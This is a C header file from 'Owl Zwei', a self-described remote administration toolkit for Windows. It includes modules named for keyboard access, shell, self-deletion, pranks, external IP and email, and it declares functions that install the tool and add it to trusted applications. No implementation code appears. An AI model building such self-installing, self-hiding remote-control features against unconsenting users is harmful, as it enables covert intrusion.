/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#ifndef __OWL_H__
#define __OWL_H__

#include "network.h"
#include "hardware.h"
#include "taskbar.h"
#include "misc.h"
#include "mouse.h"
#include "windowpranks.h"
#include "file.h"
#include "keyboard.h"
#include "systeminfo.h"
#include "shell.h"
#include "bad.h"
#include "handlereq.h"
#include "RegHelper.h"
#include "selfdelete.h"
#include "extern_ip.h"
#include "email.h"
#include <stdlib.h>
#include <tchar.h>

DWORD WINAPI HandleClient( LPVOID param );
void  DoFirstRunTasks();
void  AddOwlToTrustedApps( bool add );
int   InstallOwl( char *path , bool install=true );
DWORD WINAPI InternetConnectionCheckerProc( LPVOID param );

#endif

